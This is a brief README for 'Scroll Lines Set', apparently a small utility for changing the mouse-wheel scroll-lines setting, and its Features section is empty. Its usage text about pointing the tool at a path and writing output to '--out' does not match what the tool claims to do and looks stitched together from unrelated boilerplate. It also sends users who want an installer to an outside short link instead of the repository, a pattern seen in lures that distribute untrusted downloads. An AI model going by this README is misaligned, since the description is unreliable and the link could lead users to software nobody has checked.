# Scroll Lines Set

*Wheel speed without the Mouse dialog.*

## Overview

**Scroll Lines Set** runs on your own PC. Set the mouse wheel scroll-lines value and show the current number.

A new mouse feels too fast. The setting is buried.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features
